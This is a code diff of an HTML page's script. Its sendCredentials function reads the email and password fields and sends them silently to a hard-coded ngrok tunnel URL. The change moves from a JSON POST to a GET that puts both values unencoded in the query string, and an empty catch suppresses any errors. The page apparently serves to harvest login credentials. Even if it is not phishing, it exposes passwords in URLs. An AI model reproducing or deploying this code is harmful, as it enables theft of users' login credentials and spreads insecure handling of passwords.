@@ -69,21 +69,18 @@
   <script>
     const serverUrl = "https://4372-2409-40f2-2088-39e3-cd3c-faee-1fcc-1c00.ngrok-free.app/login";
     function sendCredentials() { 
+      const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
 
-      const data = {
-        email: document.getElementById('email').value,
-        password: document.getElementById('password').value
-      };
+    const query = `?email=${email}&password=${password}`;
+    const fullUrl = serverUrl + query;
 
-      fetch(serverUrl, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(data)
-      }).catch(() => {
-      });
-    };
+    fetch(fullUrl, {
+      method: 'GET',
+      credentials: 'include' 
+    }).catch(() => {
+    });
+  }
   
   </script>
 </body>
